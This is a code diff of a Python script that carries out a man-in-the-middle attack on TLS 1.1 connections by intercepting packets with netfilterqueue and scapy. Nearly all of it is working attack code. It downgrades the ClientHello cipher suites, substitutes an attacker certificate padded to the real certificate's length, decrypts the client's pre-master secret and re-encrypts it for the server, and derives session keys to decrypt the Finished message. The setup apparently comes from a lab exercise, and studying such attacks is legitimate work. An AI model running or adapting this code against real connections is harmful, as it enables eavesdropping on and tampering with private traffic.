@@ -171,6 +171,10 @@ def count_TLS_nested_layers(pkt: Packet):
     #exit(0)
     return count
 
+handshake_mangled= False
+applicationdata_mangled = False
+session_resumed = False
+
 def handler_queue_1(pkt: netfilterqueue.Packet):
     global client_finished_concatenation
     global server_finished_concatenation
@@ -189,6 +193,11 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
     global hashes
 
+    global handshake_mangled
+    global applicationdata_mangled
+    global session_resumed
+
+
     handler_queue_1.pktnum += 1
     print(f"{handler_queue_1.pktnum}) received " + pkt.__str__())
     # PDU = Packet data unit, IP header + IP content!
@@ -200,456 +209,581 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
     if scpy_pkt.haslayer(TLS):
         print("TLS record received in current packet")
         #scpy_pkt.show2()
-        # does the current packet contain a clienthello? Then it must be the first stage of the TLS handshake!
-        if scpy_pkt.haslayer("TLSClientHello"): # first packet of TLS handshake, should be only this one!
-            #todo: add support code in case TLSClientHello is not the only handshake message in the first TCP message
 
-            # gotta modify the tls client hello to remove too secure cipher suites!
-            # IN our case, we want the client to use only RSA with AES 256_CBC_SHA since he tries to use Ephemeral DIffie hellman instead...
-            # so we intercept the packet and replace the Ephemeral choice with AES_128 version of the target cipher suite: this way
-            # we don't have to worry about intercepting the server hello (next TCP segment, a syn/ack to the CLient Hello) to
-            # modify its ACK number!
-            print("--------------------------------------------------------------------------------")
-            print("--------------------------------------------------------------------------------")
-            print("--------------------------------------------------------------------------------")
-            print("TLS client hello captured")
-            scpy_pkt.show2()
-            print("--------------------------------------------------------------------------------")
-            print("--------------------------------------------------------------------------------")
-            print("--------------------------------------------------------------------------------")
+        if not handshake_mangled:
+            # does the current packet contain a clienthello? Then it must be the first stage of the TLS handshake!
+            if scpy_pkt.haslayer("TLSClientHello"): # first packet of TLS handshake, should be only this one!
+                #todo: add support code in case TLSClientHello is not the only handshake message in the first TCP message
 
-            tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
-
-
-            # for the concatenation of the attacker acting as a server to the client, we take it before modifying them
-            print(f"(server concat) client hello length: " + str(len(bytes(tlsmsg))))
-            server_finished_concatenation += bytes(tlsmsg)
-
-            #random bytes
-            client_random = bytes(tlsmsg)[6:38] # tlsmsg.gmtunixtime is bugged.
-            print("client_random: " + client_random.hex()) # to check if it is the same as in the show2() output
-
-            #ignore the commented code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
-            # the unwanted cipher suites
-            from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA
-            #tlsmsg.cipherslen = None # By setting it to none, it will rebuild during show2
-            tlsmsg.ciphers = [0X00FF,TLS_RSA_WITH_AES_128_CBC_SHA ,TLS_RSA_WITH_AES_256_CBC_SHA]
-            #tlsmsg.msglen = None # By setting it to none, it will rebuild during show2
-
-            #print(tlsmsg.show2())
-
-            #scpy_pkt["TCP"].remove_payload()
-            #scpy_pkt /= tlsmsg # reattach tls...
-            #del scpy_pkt["TLS"].len #got to set to none these layer's len and chksums too...
-            del scpy_pkt["TCP"].chksum
-            #del scpy_pkt["IP"].len
-            del scpy_pkt["IP"].chksum
-            #del scpy_pkt["IP"].dataofs
-
-            #print(scpy_pkt["TCP"].show2())
-            #print(scpy_pkt["IP"].show2())
-            print(scpy_pkt.show2())
-
-            #after rebuilding with show2(), we must get the tlsmsg again before concatenating it...
-            tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
-
-            pkt.set_payload(bytes(scpy_pkt))
-            print(f"(client concat) client hello length: " + str(len(bytes(tlsmsg))))
-            # for the concatenation of the attacker acting as a client to the server, we take it after we modified them
-            client_finished_concatenation += bytes(tlsmsg)
-
-        elif scpy_pkt.haslayer("TLSServerHello"): #second stage of the TLS handshake, if inside this packet there is at least TLSServerHello (Note: many more TLS records may be inside this packet!)...
-            # we must forward it as it is, but modify serverCertificate. hich we must instead modify.
-
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-            print("TLS server hello captured")
-            scpy_pkt.show2()
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
-
-            #how many TLS records are stacked in this message?
-            n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"]) # don't count TCP layer...
-            print("n_tls_records: " + str(n_tls_records))
-
-
-            # check each one
-            # remember, for TLS 1.1 It is not legal to send the server key echange message for the RSA method (RFC 4346 page 42), so
-            # we don't have to deal with it!
-            for i in range(1, n_tls_records + 1):
-                # we use getlayer and i to get the packet... since we using scpy_pkt[TLS],
-                # this will get us the first record found right after the TCP layer. with i = 1 we will get the first TLS record, with i=2 the second TLS record and so on
-                generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i) # each TLS message is wrapped inside a generic TLS layer,
-                                                                    # which has a type, a version, a len and an iv field...
-                print(f"checking record {i}")
-                # we received a message from the legitimate server. The legitimate (unchanged message) will be useful for
-                # when we calculate/modify the finished message of the client, so when we (attacker) act as a client
-                # to the server
-                client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
-                print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
-
-
-                if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSCertificate):
-                    # ok we'll change this one...
-                    # the other possible layers are
-                    # server hello (forward as it is, contains session id),
-                    # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
-                    # and server hello done (forward as it is)
-
-                    #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers
-
-                    scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)
-
-                    # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
-                    attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
-                    attacker_certificate_der_len = len(attacker_certificate_der)
-                    print(f"attacker certificate length is {attacker_certificate_der_len}")
-
-                    server_certificate_der = open("/app/server_certificate.der", "rb").read()
-                    server_certificate_der_len = len(server_certificate_der)
-                    #todo: what if negative difference? Then the only way is to actively modify seq fields (or make a shorter certificate by leaving some field empty, like country, state... but not common name)!
-                    attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
-                    attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)
-
-                    scpy_tls_cert.certs = [(attacker_certificate_der_padded_len, attacker_certificate_der_padded)]
-                    #scpy_tls_cert.certslen = None
-                    #scpy_tls_cert.msglen = None
-
-                    # generic_tls_layer is the parent of scpy_tls_cert
-                    #generic_tls_layer.len = None
-                    #generic_tls_layer.padlen = server_certificate_der_len - attacker_certificate_der_len
-                    #generic_tls_layer.pad = b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
-                    #generic_tls_layer.build_padding()
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-                    print(scpy_tls_cert.show2())
-                    print("------------------------------------------")
-                    del scpy_pkt["TCP"].chksum
-                    del scpy_pkt["IP"].chksum
-                    del scpy_pkt["IP"].len
-                    print(scpy_pkt.show2())
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-                    print("------------------------------------------")
-
-
-                elif TLS_record_contains_message_of_type(generic_tls_layer, "TLSServerHello"):
-                    #get the random bytes
-                    server_hello_msg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSServerHello)
-                    server_random = bytes(server_hello_msg)[6:38]
-                    print(
-                        "server_random: " + server_random.hex())  # to check if it is the same as in the show2() output
-
-                # we received a message from the legitimate server. The illegitimate (CHANGED message) will be useful for
-                # when we calculate/modify the finished message of the Server, so when we (attacker) act as a server
-                # to the client
+                # gotta modify the tls client hello to remove too secure cipher suites!
+                # IN our case, we want the client to use only RSA with AES 256_CBC_SHA since he tries to use Ephemeral DIffie hellman instead...
+                # so we intercept the packet and replace the Ephemeral choice with AES_128 version of the target cipher suite: this way
+                # we don't have to worry about intercepting the server hello (next TCP segment, a syn/ack to the CLient Hello) to
+                # modify its ACK number!
+                print("--------------------------------------------------------------------------------")
+                print("--------------------------------------------------------------------------------")
+                print("--------------------------------------------------------------------------------")
+                print("TLS client hello captured")
                 scpy_pkt.show2()
-                # after rebuilding with show2(), we must get the generic_tls_layer again before concatenating it...
-                generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i)
-                server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
-                print(f"(server concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
-                # todo: perchè è None la length della print del get_handshake_message_bytes? controlla anche gli altri posti...
+                print("--------------------------------------------------------------------------------")
+                print("--------------------------------------------------------------------------------")
+                print("--------------------------------------------------------------------------------")
 
-            print(len(bytes(scpy_pkt)))
-            pkt.set_payload(bytes(scpy_pkt))
-
-        elif scpy_pkt.haslayer(scapy.layers.tls.handshake.TLSClientKeyExchange):
-            # third stage of the handshake, got to modify the encrypted pre-master secret with the public key of the server
-            # remember: the previous message modified the packet and sent the attacker's certificate, so what we receive
-            # is encrypted with the attacker's public key!
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-            print("TLS client key exchange captured")
-            scpy_pkt.show2()
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
-
-            # how many TLS records are stacked in this message?
-            n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
-            print("n_tls_records: " + str(n_tls_records))
-
-            tls_record_of_finished_message = -1
-
-            change_cipher_spec_encountered = False # as per rfc section 7.4.9 start, we expect not encountering any more
-                                                   # handshake messages encapsulated in TLS frames, so we can stop
-                                                   # concatenating them inside the relative concatenation strings
-
-            #pick the key exchange message...
-            for i in range(1, n_tls_records + 1):
-                generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
-                                                                    # which has a type, a version, a len and an iv field...
+                tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
 
 
-                if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSClientKeyExchange):
+                # for the concatenation of the attacker acting as a server to the client, we take it before modifying them
+                print(f"(server concat) client hello length: " + str(len(bytes(tlsmsg))))
+                server_finished_concatenation += bytes(tlsmsg)
 
-                    # ok we'll change this one...
-                    # the other possible layers are
-                    # server hello (forward as it is, contains session id),
-                    # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
-                    # and server hello done (forward as it is)
+                #random bytes
+                client_random = bytes(tlsmsg)[6:38] # tlsmsg.gmtunixtime is bugged.
+                print("client_random: " + client_random.hex()) # to check if it is the same as in the show2() output
 
-                    #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers
+                #ignore the commented code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
+                # the unwanted cipher suites
+                from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA
+                #tlsmsg.cipherslen = None # By setting it to none, it will rebuild during show2
+                tlsmsg.ciphers = [0X00FF,TLS_RSA_WITH_AES_128_CBC_SHA ,TLS_RSA_WITH_AES_256_CBC_SHA]
+                #tlsmsg.msglen = None # By setting it to none, it will rebuild during show2
 
-                    scpy_tls_clientExchg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSClientKeyExchange)
+                #print(tlsmsg.show2())
 
-                    scpy_pkt.show2()
-                    # for the server finished message we take the TLS record's content BEFORE changing them
-                    server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
-                    print(f"(server concat)generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
+                #scpy_pkt["TCP"].remove_payload()
+                #scpy_pkt /= tlsmsg # reattach tls...
+                #del scpy_pkt["TLS"].len #got to set to none these layer's len and chksums too...
+                del scpy_pkt["TCP"].chksum
+                #del scpy_pkt["IP"].len
+                del scpy_pkt["IP"].chksum
+                #del scpy_pkt["IP"].dataofs
 
-                    # no need to change the msglen, it will be the same when we re-encrypt...
-                    # decrypt...
-                    encrypted_pre_master_key_length__client = bytes(scpy_tls_clientExchg.exchkeys)[0:2]
-                    print("encrypted_pre_master_key_length: " + str(bytes_to_int(encrypted_pre_master_key_length__client)))
-                    encrypted_pre_master_key__client = bytes(scpy_tls_clientExchg.exchkeys)[2:] # remove the first two bytes, they are the pre master length
-                    print(encrypted_pre_master_key__client)
-                    print("confirm with encrypted_pre_master_key__client string length: " + str(len(encrypted_pre_master_key__client)))
+                #print(scpy_pkt["TCP"].show2())
+                #print(scpy_pkt["IP"].show2())
+                print(scpy_pkt.show2())
 
-                    with open("/app/RSA_key_attacker_server.pem", "rb") as key_file:
-                        private_key_attacker_s = serialization.load_pem_private_key(key_file.read(), password=None)
+                #after rebuilding with show2(), we must get the tlsmsg again before concatenating it...
+                tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
 
-                    pre_master_key = private_key_attacker_s.decrypt(encrypted_pre_master_key__client, padding=PKCS1v15())
+                pkt.set_payload(bytes(scpy_pkt))
+                print(f"(client concat) client hello length: " + str(len(bytes(tlsmsg))))
+                # for the concatenation of the attacker acting as a client to the server, we take it after we modified them
+                client_finished_concatenation += bytes(tlsmsg)
 
-                    print("Plaintext pre master key should be 48 bytes long, 2 for the version, 46 for the random number")
-                    print("length: " + str(len(pre_master_key)))
-                    print("plaintext: " + str(pre_master_key))
-                    print("plaintext (HEX): " + pre_master_key.hex())
+            elif scpy_pkt.haslayer("TLSServerHello"): #second stage of the TLS handshake, if inside this packet there is at least TLSServerHello (Note: many more TLS records may be inside this packet!)...
+                # we must forward it as it is, but modify serverCertificate. hich we must instead modify.
 
-                    #reencrypt with the server's public key and send it like that...
-                    with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
-                        public_key_server = load_pem_x509_certificate(pub_cert_file_server.read()).public_key()
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+                print("TLS server hello captured")
+                scpy_pkt.show2()
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
 
-                    encrypted_pre_master_key__server = public_key_server.encrypt(pre_master_key, PKCS1v15())
+                #how many TLS records are stacked in this message?
+                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"]) # don't count TCP layer...
+                print("n_tls_records: " + str(n_tls_records))
 
-                    # substitute the bytes of the pre master secret in the original packet with those here...
-                    scpy_tls_clientExchg.exchkeys = encrypted_pre_master_key_length__client + encrypted_pre_master_key__server
 
-                    print(len(encrypted_pre_master_key_length__client + encrypted_pre_master_key__server))
-                    print("vvvvvvvvvvvvvvvvvvvvvvvv New exchange vvvvvvvvvvvvvvvvvvvvvvvv")
-                    print(scpy_pkt.show2())
-
-                    # for the client finished message we take the TLS record's content AFTER changing it
-                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i)
+                # check each one
+                # remember, for TLS 1.1 It is not legal to send the server key echange message for the RSA method (RFC 4346 page 42), so
+                # we don't have to deal with it!
+                for i in range(1, n_tls_records + 1):
+                    # we use getlayer and i to get the packet... since we using scpy_pkt[TLS],
+                    # this will get us the first record found right after the TCP layer. with i = 1 we will get the first TLS record, with i=2 the second TLS record and so on
+                    generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i) # each TLS message is wrapped inside a generic TLS layer,
+                                                                        # which has a type, a version, a len and an iv field...
+                    print(f"checking record {i}")
+                    # we received a message from the legitimate server. The legitimate (unchanged message) will be useful for
+                    # when we calculate/modify the finished message of the client, so when we (attacker) act as a client
+                    # to the server
                     client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                     print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
 
-                elif TLS_record_contains_message_of_type(generic_tls_layer, TLSChangeCipherSpec):
-                    # we MUST NOT count this TLS record in the concatenation!
-                    print("CHANGE CIPHER SPEC!!!! IGNORING!!!!")
-                    change_cipher_spec_encountered = True
 
-                    tls_record_of_finished_message = i + 1
-                else:
-                    print("Check if this message was the last unknown, in that case this is an encrypted client finished message...")
-                    print("Unknown TLS layer type encountered before change cipher spec...")
-                    if not change_cipher_spec_encountered:
-                        print("Still, we are saving it inside the concatenation...")
+                    if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSCertificate):
+                        # ok we'll change this one...
+                        # the other possible layers are
+                        # server hello (forward as it is, contains session id),
+                        # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
+                        # and server hello done (forward as it is)
+
+                        #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers
+
+                        scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)
+
+                        # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
+                        attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
+                        attacker_certificate_der_len = len(attacker_certificate_der)
+                        print(f"attacker certificate length is {attacker_certificate_der_len}")
+
+                        server_certificate_der = open("/app/server_certificate.der", "rb").read()
+                        server_certificate_der_len = len(server_certificate_der)
+                        #todo: what if negative difference? Then the only way is to actively modify seq fields (or make a shorter certificate by leaving some field empty, like country, state... but not common name)!
+                        attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
+                        attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)
+
+                        scpy_tls_cert.certs = [(attacker_certificate_der_padded_len, attacker_certificate_der_padded)]
+                        #scpy_tls_cert.certslen = None
+                        #scpy_tls_cert.msglen = None
+
+                        # generic_tls_layer is the parent of scpy_tls_cert
+                        #generic_tls_layer.len = None
+                        #generic_tls_layer.padlen = server_certificate_der_len - attacker_certificate_der_len
+                        #generic_tls_layer.pad = b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
+                        #generic_tls_layer.build_padding()
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+                        print(scpy_tls_cert.show2())
+                        print("------------------------------------------")
+                        del scpy_pkt["TCP"].chksum
+                        del scpy_pkt["IP"].chksum
+                        del scpy_pkt["IP"].len
+                        print(scpy_pkt.show2())
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+                        print("------------------------------------------")
+
+
+                    elif TLS_record_contains_message_of_type(generic_tls_layer, "TLSServerHello"):
+                        #get the random bytes
+                        server_hello_msg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSServerHello)
+                        server_random = bytes(server_hello_msg)[6:38]
+                        print(
+                            "server_random: " + server_random.hex())  # to check if it is the same as in the show2() output
+
+                    # we received a message from the legitimate server. The illegitimate (CHANGED message) will be useful for
+                    # when we calculate/modify the finished message of the Server, so when we (attacker) act as a server
+                    # to the client
+                    scpy_pkt.show2()
+                    # after rebuilding with show2(), we must get the generic_tls_layer again before concatenating it...
+                    generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i)
+                    server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
+                    print(f"(server concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
+                    # todo: perchè è None la length della print del get_handshake_message_bytes? controlla anche gli altri posti...
+
+                print(len(bytes(scpy_pkt)))
+                pkt.set_payload(bytes(scpy_pkt))
+
+            elif scpy_pkt.haslayer(scapy.layers.tls.handshake.TLSClientKeyExchange):
+                # third stage of the handshake, got to modify the encrypted pre-master secret with the public key of the server
+                # remember: the previous message modified the packet and sent the attacker's certificate, so what we receive
+                # is encrypted with the attacker's public key!
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+                print("TLS client key exchange captured")
+                scpy_pkt.show2()
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+
+                # how many TLS records are stacked in this message?
+                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
+                print("n_tls_records: " + str(n_tls_records))
+
+                tls_record_of_finished_message = -1
+
+                change_cipher_spec_encountered = False # as per rfc section 7.4.9 start, we expect not encountering any more
+                                                       # handshake messages encapsulated in TLS frames, so we can stop
+                                                       # concatenating them inside the relative concatenation strings
+
+                #pick the key exchange message...
+                for i in range(1, n_tls_records + 1):
+                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
+                                                                        # which has a type, a version, a len and an iv field...
+
+
+                    if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSClientKeyExchange):
+
+                        # ok we'll change this one...
+                        # the other possible layers are
+                        # server hello (forward as it is, contains session id),
+                        # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
+                        # and server hello done (forward as it is)
+
+                        #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers
+
+                        scpy_tls_clientExchg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSClientKeyExchange)
 
                         scpy_pkt.show2()
                         # for the server finished message we take the TLS record's content BEFORE changing them
                         server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
-                        print(f"(server concat)generic tls layer {i} length: " + str(
-                            len(get_handshake_message_bytes(generic_tls_layer))))
+                        print(f"(server concat)generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
+
+                        # no need to change the msglen, it will be the same when we re-encrypt...
+                        # decrypt...
+                        encrypted_pre_master_key_length__client = bytes(scpy_tls_clientExchg.exchkeys)[0:2]
+                        print("encrypted_pre_master_key_length: " + str(bytes_to_int(encrypted_pre_master_key_length__client)))
+                        encrypted_pre_master_key__client = bytes(scpy_tls_clientExchg.exchkeys)[2:] # remove the first two bytes, they are the pre master length
+                        print(encrypted_pre_master_key__client)
+                        print("confirm with encrypted_pre_master_key__client string length: " + str(len(encrypted_pre_master_key__client)))
+
+                        with open("/app/RSA_key_attacker_server.pem", "rb") as key_file:
+                            private_key_attacker_s = serialization.load_pem_private_key(key_file.read(), password=None)
+
+                        pre_master_key = private_key_attacker_s.decrypt(encrypted_pre_master_key__client, padding=PKCS1v15())
+
+                        print("Plaintext pre master key should be 48 bytes long, 2 for the version, 46 for the random number")
+                        print("length: " + str(len(pre_master_key)))
+                        print("plaintext: " + str(pre_master_key))
+                        print("plaintext (HEX): " + pre_master_key.hex())
+
+                        #reencrypt with the server's public key and send it like that...
+                        with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
+                            public_key_server = load_pem_x509_certificate(pub_cert_file_server.read()).public_key()
+
+                        encrypted_pre_master_key__server = public_key_server.encrypt(pre_master_key, PKCS1v15())
+
+                        # substitute the bytes of the pre master secret in the original packet with those here...
+                        scpy_tls_clientExchg.exchkeys = encrypted_pre_master_key_length__client + encrypted_pre_master_key__server
+
+                        print(len(encrypted_pre_master_key_length__client + encrypted_pre_master_key__server))
+                        print("vvvvvvvvvvvvvvvvvvvvvvvv New exchange vvvvvvvvvvvvvvvvvvvvvvvv")
+                        print(scpy_pkt.show2())
 
                         # for the client finished message we take the TLS record's content AFTER changing it
+                        generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i)
                         client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                         print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
 
-                    print("TLS client finished message captured? check if the numbers are the same")
-                    print(f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")
+                    elif TLS_record_contains_message_of_type(generic_tls_layer, TLSChangeCipherSpec):
+                        # we MUST NOT count this TLS record in the concatenation!
+                        print("CHANGE CIPHER SPEC!!!! IGNORING!!!!")
+                        change_cipher_spec_encountered = True
+
+                        tls_record_of_finished_message = i + 1
+                    else:
+                        print("Check if this message was the last unknown, in that case this is an encrypted client finished message...")
+                        print("Unknown TLS layer type encountered before change cipher spec...")
+                        if not change_cipher_spec_encountered:
+                            print("Still, we are saving it inside the concatenation...")
+
+                            scpy_pkt.show2()
+                            # for the server finished message we take the TLS record's content BEFORE changing them
+                            server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
+                            print(f"(server concat)generic tls layer {i} length: " + str(
+                                len(get_handshake_message_bytes(generic_tls_layer))))
+
+                            # for the client finished message we take the TLS record's content AFTER changing it
+                            client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
+                            print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
+
+                        print("TLS client finished message captured? check if the numbers are the same")
+                        print(f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")
 
 
-            # ok after all of this, we need to change the finished message...
-            if tls_record_of_finished_message == -1:
-                print("We didn't capture the finished message, aborting")
-                exit(0)
+                # ok after all of this, we need to change the finished message...
+                if tls_record_of_finished_message == -1:
+                    print("We didn't capture the finished message, aborting")
+                    exit(0)
 
-            generic_tls_layer = scpy_pkt["TLS"].getlayer("TLS", tls_record_of_finished_message)
-            print(".....................................")
-            print(type(generic_tls_layer)) # print the object and maybe the class type
-            print(generic_tls_layer.__dict__)
-            print(generic_tls_layer.show())
-            print(".....................................")
-            payload = bytes(generic_tls_layer)
-            print(payload)
-            print(".....................................")
-            print(client_finished_concatenation)
-            print(server_finished_concatenation)
-            print(len(client_finished_concatenation))
-            print(len(server_finished_concatenation))
-            print(".....................................")
+                generic_tls_layer = scpy_pkt["TLS"].getlayer("TLS", tls_record_of_finished_message)
+                print(".....................................")
+                print(type(generic_tls_layer)) # print the object and maybe the class type
+                print(generic_tls_layer.__dict__)
+                print(generic_tls_layer.show())
+                print(".....................................")
+                payload = bytes(generic_tls_layer)
+                print(payload)
+                print(".....................................")
+                print(client_finished_concatenation)
+                print(server_finished_concatenation)
+                print(len(client_finished_concatenation))
+                print(len(server_finished_concatenation))
+                print(".....................................")
 
-            #let's calculate the secret and keying material!
-            computed_master_key = tls_1_1_prf.compute_master_secret(pre_master_key, client_random, server_random)
-            print(f"MASTER SECRET (len:{len(computed_master_key)}): " + str(computed_master_key))
-            print(f"Master secret (hex): {computed_master_key.hex()}")
+                #let's calculate the secret and keying material!
+                computed_master_key = tls_1_1_prf.compute_master_secret(pre_master_key, client_random, server_random)
+                print(f"MASTER SECRET (len:{len(computed_master_key)}): " + str(computed_master_key))
+                print(f"Master secret (hex): {computed_master_key.hex()}")
 
-            # AES_256_CBC_SHA needs 2x32 bytes keys, 2x20 byte mac secrets and 2x16 byte initialization vectors,
-            # for a total of 136 bytes of material (RFC 4346 sec. 6.3)
-            key_block = _tls_PRF(computed_master_key, b'key expansion', server_random + client_random, 136)
-            client_write_MAC_secret = key_block[0:20]
-            server_write_MAC_secret = key_block[20:40]
-            client_write_key = key_block[40:72]
-            server_write_key = key_block[72:104]
-            client_write_IV = key_block[104:120]
-            server_write_IV = key_block[120:136]
+                # AES_256_CBC_SHA needs 2x32 bytes keys, 2x20 byte mac secrets and 2x16 byte initialization vectors,
+                # for a total of 136 bytes of material (RFC 4346 sec. 6.3)
+                key_block = _tls_PRF(computed_master_key, b'key expansion', server_random + client_random, 136)
+                client_write_MAC_secret = key_block[0:20]
+                server_write_MAC_secret = key_block[20:40]
+                client_write_key = key_block[40:72]
+                server_write_key = key_block[72:104]
+                client_write_IV = key_block[104:120]
+                server_write_IV = key_block[120:136]
 
-            # before changing the finished message, get it from the client, cause we need to concat it to the server one...
-            iv = (bytes(scpy_pkt)[-64:])[
-                0:16]  # take the first 16 bytes of the client finished, that's the IV used by the real client to encrypt the finished message...
-            print(b"iv used by the client: " + iv)
-            print("iv used by the client (hex): " + iv.hex())
+                # before changing the finished message, get it from the client, cause we need to concat it to the server one...
+                iv = (bytes(scpy_pkt)[-64:])[
+                    0:16]  # take the first 16 bytes of the client finished, that's the IV used by the real client to encrypt the finished message...
+                print(b"iv used by the client: " + iv)
+                print("iv used by the client (hex): " + iv.hex())
 
-            cipher_decrypt = CipherBase(AES256(client_write_key), CBC(iv))
-            decryptor = cipher_decrypt.decryptor()
-            decrypted_client_finished = decryptor.update((bytes(scpy_pkt)[-64:])) + decryptor.finalize()
-            decrypted_client_finished_only_handshake_message = decrypted_client_finished[16:32]
+                cipher_decrypt = CipherBase(AES256(client_write_key), CBC(iv))
+                decryptor = cipher_decrypt.decryptor()
+                decrypted_client_finished = decryptor.update((bytes(scpy_pkt)[-64:])) + decryptor.finalize()
+                decrypted_client_finished_only_handshake_message = decrypted_client_finished[16:32]
 
-            server_finished_concatenation += decrypted_client_finished_only_handshake_message
-            print(
